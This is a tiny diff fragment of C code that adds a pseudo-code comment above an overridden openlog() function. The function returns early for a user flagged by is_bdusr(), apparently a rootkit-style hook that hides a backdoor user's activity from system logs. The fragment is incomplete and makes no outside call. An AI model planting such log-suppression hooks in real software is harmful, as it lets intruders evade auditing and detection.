@@ -1,3 +1,12 @@
+/*
+ *
+ * int find_psysdproc();
+ * if(getpid() == find_psysdproc())
+ * &&
+ * !strstr()
+ *
+ */
+
 void openlog(const char *ident, int option, int facility)
 {
     if(is_bdusr()) return;
